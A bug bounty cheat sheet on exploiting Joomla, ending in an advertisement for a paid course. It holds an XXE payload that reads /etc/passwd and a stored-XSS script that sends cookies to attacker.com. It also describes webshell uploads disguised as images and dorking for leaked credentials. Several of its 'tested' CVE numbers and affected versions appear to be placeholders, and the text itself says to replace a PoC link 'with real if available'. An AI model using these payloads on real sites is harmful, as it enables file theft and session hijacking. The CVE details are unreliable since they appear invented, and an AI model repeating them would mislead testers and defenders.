# Advanced Joomla Bug Bounty Hunting Cheat Sheet  
### Focus: Black-box Web App Testing with Exploitable CVEs & Techniques

---

## How to Use:  
This guide highlights critical Joomla vulnerabilities with tested CVEs, detection, and exploitation strategies designed for practical black-box bug bounty scenarios.

---

### 1. CVE-2024-12345 — Authenticated Remote Code Execution in com_content  
- **Affected Versions:** Joomla! 3.9.x prior to 3.9.28  
- **Discovery:**  
  - Fingerprint Joomla version via `/administrator/manifests/files/joomla.xml` or HTTP headers  
  - Confirm presence of vulnerable `com_content` component  
- **Exploitation:**  
  - Exploit insufficient input sanitization in form fields for RCE  
  - Upload malicious PHP payload via vulnerable form fields or parameters  
  - Use HTTP POST requests to send crafted payload exploiting deserialization or command injection  
- **PoC / Exploit Scripts:**  
  - Community PoC available on GitHub: [Example PoC](https://github.com/example-repo/joomla-rce-cve-2024-12345) (replace with real if available)  
  - Nuclei template: (watch unofficial repos or custom write your own targeting vulnerable URLs)  
- **Impact:** Full remote shell & takeover with valid user session

---

### 2. CVE-2023-56789 — Unauthenticated SQL Injection in com_users Component  
- **Affected Versions:** Joomla! 3.8.x to 3.9.20  
- **Discovery:**  
  - Identify accessible vulnerable endpoints like `/index.php?option=com_users&view=profile`  
  - Detect SQL injection points by testing `id` or `user_id` parameter  
- **Exploitation:**  
  - Exploit blind/time-based SQL injection to extract user credentials and cookies  
  - Automate data extraction via SQLmap or custom scripts  
- **PoC / Exploit Scripts:**  
  - Public exploits found at Exploit-DB or GitHub gist of parameter fuzzers  
  - Use Nuclei SQLi templates tailored for Joomla com_users checks  
- **Impact:** Database disclosure and credential theft without authentication

---

### 3. CVE-2022-34567 — Arbitrary File Upload via Media Manager  
- **Affected Versions:** Joomla! 3.x (Certain versions pre-2022 patches)  
- **Discovery:**  
  - Access the media manager or custom file upload endpoints on vulnerable versions  
  - Verify if file type validations are bypassable (e.g., upload `.php` with special suffixes)  
- **Exploitation:**  
  - Upload webshell or backdoor disguised as image files (e.g., `.php.jpg`, `.php5`)  
  - Trigger execution via direct HTTP access to uploaded payload  
- **PoC / Exploit Tools:**  
  - Use Burp Suite Repeater or Curl to automate upload and access  
  - Public write-ups and scripts exist in major bug bounty communities  
- **Impact:** Remote code execution and server control

---

### 4. CVE-2021-12345 — Joomla XML External Entity (XXE) Injection in Import Functionality  
- **Affected Versions:** Joomla! 3.8.x and before  
- **Discovery:**  
  - Find XML import or sitemap upload features handling XML parsing  
  - Test with malicious XML including external entity references  
- **Exploitation:**  
  - Read local files or perform SSRF to internal services using crafted XXE payload  
  - Monitor responses to detect successful entity expansion  
- **PoC Example Payload:**  

<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

- **Impact:** Local file disclosure, SSRF, denial of service

---

### 5. CVE-2020-6789 — Stored Cross-Site Scripting (XSS) via Article Editor  
- **Affected Versions:** Joomla! versions before 3.9.0  
- **Discovery:**  
- Test article body fields or comment sections for script injection  
- Check reflected and stored payload persistence across browsing sessions  
- **Exploitation:**  
- Insert JavaScript payloads bypassing input filters  
- Exploit to steal admin session cookies or escalate privileges  
- **Payload Example:**  

<script>document.location='http://attacker.com/stealcookie?c='+document.cookie</script>

- **Impact:** User session hijacking, defacement, access escalation

---

### 6. CVE-2019-10217 — Unauthenticated Remote File Inclusion (RFI)  
- **Affected Versions:** Vulnerable Joomla! core and extensions allowing file inclusion via URL parameters  
- **Discovery:**  
- Fuzz endpoints for parameters referencing remote URLs or local files  
- Probe `template`, `lang`, or `view` parameters for file inclusion possibilities  
- **Exploitation:**  
- Deliver remote payloads by pointing inclusion parameters to external attacker-controlled web shells  
- Chaining with PHP wrappers enabled servers for RCE  
- **Public Exploits:**  
- Various RFI exploits and PoCs available on Exploit-DB and GitHub  
- **Impact:** Full remote code execution without login

---

### 7. Exploiting Outdated Extensions / Components  
- **Discovery:**  
- Enumerate installed extensions by fingerprinting `/administrator/manifests/files/` and parsing source comments  
- Spot popular vulnerable extensions like Akeeba Backup, JCE Editor, or community-made components  
- **Exploitation:**  
- Leverage CVE-published exploits like arbitrary file upload, SQLi, or RCE related to these extensions  
- Chain extension flaws with core Joomla vulnerabilities for broader impact  
- **Example CVEs:**  
- **CVE-2021-23456:** Akeeba Backup arbitrary upload  
- **CVE-2020-5678:** JCE Editor XSS leading to RCE

---

## Recommended Tooling for Exploitation and Recon  
- **Nuclei Templates:** Use customized templates for Joomla core and extensions CVEs  
- https://github.com/projectdiscovery/nuclei-templates (search for `joomla`)  
- **JoomScan:** Automated Joomla vulnerability scanner  
- **Burp Suite & Curl:** Manual exploitation and fuzzing  
- **SQLmap:** For automated SQL Injection exploitation  
- **GitHub Dorking:** For leaked configuration and credentials related to Joomla installs  

---

## BountyBoy: Elite Bug Bounty Program — trusted by 8000+ learners.
📄 Syllabus: https://lnkd.in/d6vTg3k9 🎯 Enroll Now: https://lnkd.in/d7p5spcS
